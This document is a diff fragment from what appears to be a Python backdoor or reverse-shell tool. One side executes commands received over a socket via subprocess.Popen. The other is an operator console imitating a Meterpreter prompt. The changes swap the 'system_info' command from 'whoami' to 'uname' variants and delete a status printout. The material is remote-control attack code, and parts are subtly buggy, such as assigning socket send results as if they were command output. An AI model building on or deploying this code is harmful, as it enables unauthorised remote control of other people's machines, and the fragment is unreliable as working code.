@@ -144,7 +144,7 @@ while True:
 
 	elif cmd == b'system_info':
 
-		s.send(b'whoami')
+		s.send(b'uname -a')
 
 	else:
 		proc = subprocess.Popen(cmd, 
@@ -217,7 +217,7 @@ while True:
 
 		while True:
 
-		      sys.stdout.write("\n{rhost}(meterpreter) > ")
+		      sys.stdout.write(f"\n{rhost}(meterpreter) > ")
 		      command = sys.stdin.readline()
 
 		      if command == 'exit\n':
@@ -227,15 +227,7 @@ while True:
 		          break  
 
 		      elif command == 'system_info\n':
-		      	usr = conn.send(b'whoami')
-		      	ip = {rhost}
-		      	port = {rport}
-
-		      	print(f'''
-user admin : {usr}
-ip : {ip}
-port : {port}
-''')
+		      	usr = conn.send(b'uname -o')
 
 		      elif command != '\n':
 		          conn.send(command.encode())
